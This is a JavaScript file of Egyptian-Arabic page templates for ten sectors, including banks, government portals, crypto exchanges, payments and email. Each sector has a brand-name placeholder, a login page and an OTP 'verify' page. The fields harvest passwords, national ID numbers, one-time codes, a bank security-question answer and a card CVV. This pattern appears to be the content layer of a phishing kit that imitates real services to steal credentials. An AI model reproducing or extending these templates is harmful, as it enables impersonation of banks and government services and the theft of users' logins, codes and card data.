// قوالب المحتوى الأساسية (10 قطاعات)
export const BLUEPRINTS = {
  social: {
    theme: 'social',
    login: {
      slug: 'login',
      page_title: 'تسجيل الدخول',
      headline_tpl: 'أهلاً بيك في {name}',
      sub_tpl: 'سجّل دخولك لمتابعة أصدقائك',
      body_tpl: 'أدخل إيميلك أو رقم موبايلك',
      cta_tpl: 'متابعة',
      fields: ['identifier', 'password'],
      layout: 'auth'
    },
    otp: {
      slug: 'verify',
      page_title: 'التحقق',
      headline_tpl: 'أدخل كود التحقق',
      sub_tpl: 'بعتنا كود 6 أرقام على موبايلك',
      body_tpl: 'الكود صالح 5 دقايق',
      cta_tpl: 'تأكيد',
      otp_type: 'sms',
      otp_length: 6,
      fields: ['code'],
      layout: 'otp'
    },
    home: {
      slug: 'home',
      page_title: 'الرئيسية',
      headline_tpl: '{name} — تواصل بلا حدود',
      sub_tpl: 'شارك لحظاتك وابقَ على اتصال',
      body_tpl: 'منصة {name} بتجمعلك أصدقاءك واهتماماتك.',
      cta_tpl: 'ابدأ الآن',
      fields: ['name', 'email', 'phone'],
      layout: 'hero-center'
    },
    features: {
      slug: 'features',
      page_title: 'المميزات',
      headline_tpl: 'ليه {name}؟',
      sub_tpl: 'كل اللي محتاجه للتواصل',
      features: [
        { title: 'منشورات فورية', desc: 'شارك صورك في لحظة.' },
        { title: 'رسائل مشفرة', desc: 'محادثات آمنة E2E.' },
        { title: 'بث مباشر', desc: 'ابث لحظاتك مباشرة.' },
        { title: 'قصص 24 ساعة', desc: 'لحظات بتختفي بعد يوم.' },
        { title: 'مجموعات', desc: 'انشئ مجتمع حول اهتماماتك.' },
        { title: 'إشعارات ذكية', desc: 'مش هتفوّت أي حاجة.' }
      ],
      cta_tpl: 'جرّب المميزات',
      layout: 'cards'
    },
    pricing: {
      slug: 'pricing',
      page_title: 'الخطط',
      headline_tpl: 'خطط {name}',
      sub_tpl: 'اختار اللي يناسبك',
      plans: [
        { name: 'مجاني', price: '0', period: 'للأبد', features: ['منشورات لا محدودة', 'رسائل', 'قصص', 'مجموعات'] },
        { name: 'بلس', price: '99', period: 'شهرياً', features: ['كل المجاني +', 'بث مباشر', 'تحليلات', 'دعم مميز'], popular: true },
        { name: 'بريميوم', price: '199', period: 'شهرياً', features: ['كل البلس +', 'شهادات موثقة', 'تخزين سحابي', 'أولوية دعم'] }
      ],
      cta_tpl: 'اشترك الآن',
      layout: 'hero-center'
    }
  },

  government: {
    theme: 'government',
    login: { slug: 'login', page_title: 'دخول البوابة', headline_tpl: 'بوابة {name}', sub_tpl: 'سجّل دخولك', body_tpl: 'أدخل رقمك القومي', cta_tpl: 'متابعة', fields: ['national_id', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: 'التحقق', headline_tpl: 'تحقق من هويتك', sub_tpl: 'بعتنا كود على موبايلك', body_tpl: 'الكود صالح 5 دقايق', cta_tpl: 'تأكيد', otp_type: 'sms', otp_length: 6, fields: ['code'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — خدمة موثوقة', sub_tpl: 'نعمل لخدمتك', body_tpl: 'بتقدم خدمات حكومية بمعايير عالمية.', cta_tpl: 'استعلم', fields: ['name', 'national_id', 'phone'], layout: 'hero-center' },
    features: { slug: 'services', page_title: 'الخدمات', headline_tpl: 'خدمات {name}', sub_tpl: 'كل خدمة في مكانها', features: [{ title: 'استعلام فوري', desc: 'استعلم في ثواني.' }, { title: 'شفافية', desc: 'كل خطوة موثقة.' }], cta_tpl: 'استعرض', layout: 'cards' },
    pricing: { slug: 'plans', page_title: 'الخطط', headline_tpl: 'خطط {name}', sub_tpl: 'اختر ما يناسبك', plans: [{ name: 'عامة', price: '0', period: 'مجاناً', features: ['استعلامات'] }, { name: 'مميزة', price: '149', period: 'شهرياً', features: ['لا محدودة'], popular: true }], cta_tpl: 'اطلب', layout: 'hero-center' }
  },

  banks: {
    theme: 'banks',
    login: { slug: 'login', page_title: 'الخدمات', headline_tpl: 'أهلاً في {name}', sub_tpl: 'سجّل دخولك', body_tpl: 'أدخل بيانات المستخدم', cta_tpl: 'دخول', fields: ['username', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: 'التحقق', headline_tpl: 'تأكيد', sub_tpl: 'كود + أمان', body_tpl: 'لا تشارك الكود', cta_tpl: 'تأكيد', otp_type: 'sms+security', otp_length: 6, security_question: 'اسم أول مدرسة؟', fields: ['code', 'security_answer'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — أموالك آمن', sub_tpl: 'خدمات مصرفية', body_tpl: 'حلول مصرفية متكاملة.', cta_tpl: 'افتح حسابك', fields: ['name', 'phone', 'email'], layout: 'hero-split' },
    features: { slug: 'products', page_title: 'المنتجات', headline_tpl: 'منتجات {name}', sub_tpl: 'كل ما تحتاجه', features: [{ title: 'حساب جاري', desc: 'بدون رسوم.' }, { title: 'تحويلات', desc: 'فورية.' }], cta_tpl: 'اكتشف', layout: 'cards' },
    pricing: { slug: 'plans', page_title: 'الحسابات', headline_tpl: 'حسابات {name}', sub_tpl: 'اختر', plans: [{ name: 'كلاسيك', price: '0', period: 'مجاناً', features: ['حساب'] }, { name: 'جولد', price: '99', period: 'شهرياً', features: ['كل الكلاسيك +'], popular: true }], cta_tpl: 'اختر', layout: 'hero-center' }
  },

  crypto: {
    theme: 'crypto',
    login: { slug: 'login', page_title: 'تسجيل الدخول', headline_tpl: 'سجّل دخولك لـ {name}', sub_tpl: 'أكمل تداولاتك', body_tpl: 'أدخل بيانات حسابك', cta_tpl: 'متابعة', fields: ['email', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: '2FA', headline_tpl: 'التحقق بخطوتين', sub_tpl: 'Google Authenticator', body_tpl: 'أو الكود بالإيميل', cta_tpl: 'تأكيد', otp_type: '2fa', otp_length: 6, fields: ['code'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — ابدأ التداول', sub_tpl: 'منصة تداول مؤسسية', body_tpl: 'تداول 350+ عملة برسوم منخفضة.', cta_tpl: 'ابدأ', fields: ['name', 'email', 'phone'], layout: 'hero-split' },
    features: { slug: 'markets', page_title: 'الأسواق', headline_tpl: 'أسواق {name}', sub_tpl: 'كل الأدوات', features: [{ title: 'سبوت', desc: '350+ عملة.' }, { title: 'فيوتشرز', desc: '125x رافعة.' }], cta_tpl: 'ابدأ', layout: 'cards' },
    pricing: { slug: 'fees', page_title: 'الرسوم', headline_tpl: 'رسوم {name}', sub_tpl: 'شفافة', plans: [{ name: 'أساسي', price: '0.10%', period: 'للصفقة', features: ['سبوت'] }, { name: 'VIP', price: '0.02%', period: 'للصفقة', features: ['كل المميزات'], popular: true }], cta_tpl: 'سجل', layout: 'hero-center' }
  },

  payments: {
    theme: 'payments',
    login: { slug: 'login', page_title: 'لوحة التحكم', headline_tpl: 'لوحة {name}', sub_tpl: 'إدارة مدفوعاتك', body_tpl: 'بيانات الحساب', cta_tpl: 'دخول', fields: ['email', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: 'التحقق', headline_tpl: 'تأكيد', sub_tpl: 'كود + CVV', body_tpl: 'حماية الحساب', cta_tpl: 'تأكيد', otp_type: 'sms+cvv', otp_length: 6, fields: ['code', 'cvv'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — استقبل المدفوعات', sub_tpl: 'حلول دفع متكاملة', body_tpl: 'اقبل البطاقات والمحافظ بأسعار تنافسية.', cta_tpl: 'ابدأ', fields: ['name', 'company', 'email', 'phone'], layout: 'hero-split' },
    features: { slug: 'solutions', page_title: 'الحلول', headline_tpl: 'حلول {name}', sub_tpl: 'كل ما تحتاج', features: [{ title: 'بوابة دفع', desc: 'بطاقات في دقايق.' }, { title: 'محفظة', desc: 'مدفوعات فورية.' }], cta_tpl: 'اكتشف', layout: 'cards' },
    pricing: { slug: 'pricing', page_title: 'الأسعار', headline_tpl: 'أسعار {name}', sub_tpl: 'شفافة', plans: [{ name: 'مجاني', price: '0', period: 'شهرياً', features: ['بوابة'] }, { name: 'نمو', price: '99', period: 'شهرياً', features: ['كل المميزات'], popular: true }], cta_tpl: 'ابدأ', layout: 'hero-center' }
  },

  email: {
    theme: 'email',
    login: { slug: 'login', page_title: 'تسجيل الدخول', headline_tpl: 'دخول {name}', sub_tpl: 'بريدك وكلمة السر', body_tpl: 'سجّل دخولك', cta_tpl: 'التالي', fields: ['email', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: 'التحقق', headline_tpl: 'تحقق من بريدك', sub_tpl: 'كود على البريد الاحتياطي', body_tpl: 'أو SMS لو ربطت رقمك', cta_tpl: 'تأكيد', otp_type: 'email', otp_length: 6, fields: ['code'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — بريدك الجديد', sub_tpl: 'بريد أسرع وأكثر أماناً', body_tpl: 'كل احتياجاتك البريدية.', cta_tpl: 'أنشئ بريدك', fields: ['name', 'email', 'phone'], layout: 'hero-center' },
    features: { slug: 'features', page_title: 'المميزات', headline_tpl: 'ليه {name}؟', sub_tpl: 'بريد يفهمك', features: [{ title: 'تخزين ضخم', desc: 'مساحة كافية.' }, { title: 'E2E', desc: 'تشفير كامل.' }], cta_tpl: 'اكتشف', layout: 'cards' },
    pricing: { slug: 'pricing', page_title: 'الخطط', headline_tpl: 'خطط {name}', sub_tpl: 'ابدأ مجاناً', plans: [{ name: 'مجاني', price: '0', period: 'للأبد', features: ['15 GB'] }, { name: 'بلس', price: '49', period: 'شهرياً', features: ['100 GB'], popular: true }], cta_tpl: 'اشترك', layout: 'hero-center' }
  },

  tech: {
    theme: 'tech',
    login: { slug: 'login', page_title: 'تسجيل الدخول', headline_tpl: 'حساب {name}', sub_tpl: 'سجّل دخولك', body_tpl: 'بريدك وكلمة السر', cta_tpl: 'متابعة', fields: ['email', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: '2FA', headline_tpl: 'التحقق', sub_tpl: 'على أجهزتك المسجلة', body_tpl: 'كود 6 أرقام', cta_tpl: 'تأكيد', otp_type: '2fa', otp_length: 6, fields: ['code'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — من الطراز الأول', sub_tpl: 'تجربة جديدة', body_tpl: 'أحدث الابتكارات.', cta_tpl: 'اكتشف', fields: ['name', 'email', 'phone'], layout: 'video-hero' },
    features: { slug: 'products', page_title: 'المنتجات', headline_tpl: 'منتجات {name}', sub_tpl: 'ابتكار في كل تفصيلة', features: [{ title: 'أداء', desc: 'أحدث معالجات.' }, { title: 'أمان', desc: 'عتاد + برمجيات.' }], cta_tpl: 'اكتشف', layout: 'cards' },
    pricing: { slug: 'pricing', page_title: 'الأسعار', headline_tpl: 'خطط {name}', sub_tpl: 'اختر', plans: [{ name: 'أساسي', price: '$499', period: 'مرة', features: ['أساسي'] }, { name: 'برو', price: '$999', period: 'مرة', features: ['متقدم'], popular: true }], cta_tpl: 'اطلب', layout: 'hero-center' }
  },

  airlines: {
    theme: 'airlines',
    login: { slug: 'login', page_title: 'تسجيل الدخول', headline_tpl: 'حساب {name}', sub_tpl: 'رحلاتك وأميالك', body_tpl: 'سجّل دخولك', cta_tpl: 'دخول', fields: ['email', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: 'التحقق', headline_tpl: 'تأكيد الحجز', sub_tpl: 'رقم الحجز + كود', body_tpl: 'في إيميل التأكيد', cta_tpl: 'تأكيد', otp_type: 'booking', otp_length: 6, fields: ['booking_ref', 'code'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — سافر معنا', sub_tpl: 'اكتشف العالم', body_tpl: '150+ وجهة.', cta_tpl: 'احجز', fields: ['name', 'email', 'phone', 'from', 'to', 'date'], layout: 'hero-split' },
    features: { slug: 'destinations', page_title: 'الوجهات', headline_tpl: 'وجهات {name}', sub_tpl: 'أماكن جديدة', features: [{ title: '+150 وجهة', desc: 'مباشرة.' }, { title: 'أميال', desc: 'اجمع واستبدل.' }], cta_tpl: 'احجز', layout: 'cards' },
    pricing: { slug: 'fares', page_title: 'الأسعار', headline_tpl: 'درجات {name}', sub_tpl: 'اختر درجة', plans: [{ name: 'اقتصادي', price: 'من $299', period: 'للرحلة', features: ['مقعد'] }, { name: 'فيرست', price: 'من $2999', period: 'للرحلة', features: ['جناح خاص'], popular: true }], cta_tpl: 'احجز', layout: 'hero-center' }
  },

  audio: {
    theme: 'audio',
    login: { slug: 'login', page_title: 'تسجيل الدخول', headline_tpl: 'دخول {name}', sub_tpl: 'أكمل استماعك', body_tpl: 'بياناتك', cta_tpl: 'دخول', fields: ['email', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: 'التحقق', headline_tpl: 'تحقق من بريدك', sub_tpl: 'كود', body_tpl: 'افتح الإيميل', cta_tpl: 'تأكيد', otp_type: 'email', otp_length: 6, fields: ['code'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — عالم من الموسيقى', sub_tpl: 'ملايين الأغاني', body_tpl: 'في أي وقت.', cta_tpl: 'جرّب', fields: ['name', 'email', 'phone'], layout: 'hero-split' },
    features: { slug: 'features', page_title: 'المميزات', headline_tpl: 'ليه {name}؟', sub_tpl: 'تجربة استماع', features: [{ title: 'بلاي ليست ذكية', desc: 'على مزاجك.' }, { title: 'HQ', desc: 'صوت استوديو.' }], cta_tpl: 'اكتشف', layout: 'cards' },
    pricing: { slug: 'pricing', page_title: 'الخطط', headline_tpl: 'خطط {name}', sub_tpl: 'بلا إعلانات', plans: [{ name: 'مجاني', price: '0', period: 'للأبد', features: ['مع إعلانات'] }, { name: 'بريميوم', price: '49', period: 'شهرياً', features: ['كل شيء'], popular: true }], cta_tpl: 'اشترك', layout: 'hero-center' }
  },

  video: {
    theme: 'video',
    login: { slug: 'login', page_title: 'تسجيل الدخول', headline_tpl: 'دخول {name}', sub_tpl: 'أكمل مشاهدتك', body_tpl: 'بياناتك', cta_tpl: 'دخول', fields: ['email', 'password'], layout: 'auth' },
    otp: { slug: 'verify', page_title: 'التحقق', headline_tpl: 'تحقق من بريدك', sub_tpl: 'كود 6 أرقام', body_tpl: 'صالح 10 دقايق', cta_tpl: 'تأكيد', otp_type: 'email', otp_length: 6, fields: ['code'], layout: 'otp' },
    home: { slug: 'home', page_title: 'الرئيسية', headline_tpl: '{name} — شاهد بلا حدود', sub_tpl: 'أفلام ومسلسلات', body_tpl: '4K على كل الأجهزة.', cta_tpl: 'شاهد', fields: ['name', 'email', 'phone'], layout: 'video-hero' },
    features: { slug: 'content', page_title: 'المحتوى', headline_tpl: 'محتوى {name}', sub_tpl: 'مكتبة ضخمة', features: [{ title: 'أفلام', desc: 'أحدث الأفلام.' }, { title: '4K HDR', desc: 'أفضل جودة.' }], cta_tpl: 'استعرض', layout: 'cards' },
    pricing: { slug: 'pricing', page_title: 'الخطط', headline_tpl: 'خطط {name}', sub_tpl: 'اختر الباقة', plans: [{ name: 'أساسي', price: '$79', period: 'شهرياً', features: ['HD'] }, { name: 'بريميوم', price: '$199', period: 'شهرياً', features: ['4K HDR'], popular: true }], cta_tpl: 'اشترك', layout: 'hero-center' }
  }
};
